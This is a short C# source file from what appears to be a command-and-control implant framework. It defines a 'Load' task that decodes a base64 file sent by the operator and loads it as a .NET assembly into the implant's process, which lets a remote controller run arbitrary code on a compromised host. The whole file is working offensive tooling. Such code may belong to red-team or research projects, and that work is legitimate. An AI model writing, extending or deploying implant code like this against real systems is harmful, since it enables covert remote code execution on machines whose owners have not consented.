using System;

using Implant.Models;
using Implant.Utils;

namespace Implant.Tasks.Execute
{
    class Load : ImplantCommands
    {
        private byte[] assemBytes { get; set; }

        public override string Name => "Load";
        public override string Execute(ImplantTask task)
        {

            assemBytes = Convert.FromBase64String(task.File);
            
            var assem = LoadFunctions.LoadAssem(assemBytes);
        
            return $"{assem.GetName().Name} loaded into implant process";
        }    }
}
